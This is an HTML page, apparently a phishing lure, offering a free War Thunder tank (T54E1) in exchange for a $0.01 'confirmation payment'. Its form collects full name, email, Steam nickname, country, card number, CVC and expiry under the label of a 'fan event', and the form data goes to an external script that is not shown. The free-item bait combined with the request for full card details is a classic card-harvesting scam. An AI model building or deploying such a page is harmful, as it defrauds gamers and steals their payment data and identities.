<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Get a free USA tank T54E1</title>
  <link rel="stylesheet" href="./style.css" />

  <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
</head>
<body>
  <div class="overlay"></div>

  <main class="card">
    <div class="hero">

      <div class="tank-wrap" aria-hidden="true">
        <img src="./img/us_t54e1.png" alt="T54E1 tank silhouette" class="tank-img" />
        <div class="tank-badge">T54E1</div>
      </div>

      <div class="content">
        <h1 class="title">Get a Free USA Tank T54E1</h1>
        <p class="subtitle">
          Join the battle now! Complete the registration below and confirm with a symbolic payment of
          <strong>$0.01</strong>.
        </p>

        <form id="registerForm" class="form" novalidate>
          <label>
            <span>Full Name</span>
            <input type="text" id="name" name="name" placeholder="John Doe" required />
          </label>

          <label>
            <span>Email</span>
            <input type="email" id="email" name="email" placeholder="you@example.com" required />
          </label>

          <label>
            <span>Steam Nickname</span>
            <input type="text" id="steamNick" name="steamNick" placeholder="Your Steam nickname" required />
          </label>

          <label>
            <span>Country</span>
            <input type="text" id="country" name="country" placeholder="USA" />
          </label>

          <fieldset class="card-fieldset" aria-label="Payment details">
            <legend>Payment details</legend>

            <label>
              <span>Card number</span>

              <input
                type="text"
                id="cardNumber"
                name="cardNumber"
                inputmode="numeric"
                autocomplete="cc-number"
                placeholder="4242 4242 4242 4242"
                maxlength="19"
                pattern="[\d ]{12,19}"
                title="Enter card number, digits only or spaces"
                required
              />
            </label>

            <div class="card-row">
              <label class="small">
                <span>CVC</span>
                <input
                  type="text"
                  id="cvc"
                  name="cvc"
                  inputmode="numeric"
                  placeholder="123"
                  maxlength="4"
                  pattern="\d{3,4}"
                  title="3 or 4 digit CVC"
                  autocomplete="cc-csc"
                  required
                />
              </label>

              <label class="small">
                <span>Expiry (MM/YY)</span>
                <input
                  type="text"
                  id="expiry"
                  name="expiry"
                  inputmode="numeric"
                  placeholder="08/27"
                  maxlength="5"
                  pattern="(0[1-9]|1[0-2])\/\d{2}"
                  title="Enter expiry in MM/YY format"
                  autocomplete="cc-exp"
                  required
                />
              </label>
            </div>


          <button type="submit" id="payBtn">Confirm Registration — $0.01</button>
          <p id="message" class="message" aria-live="polite"></p>
        </form>

        <p class="legal">© 2025 War Thunder Fan Event. All rights reserved.</p>
      </div>
    </div>
  </main>

  <footer>
    <p class="footer-small">Promotional event — terms apply.</p>
  </footer>

  <script src="./script.js"></script>

</body>
</html>
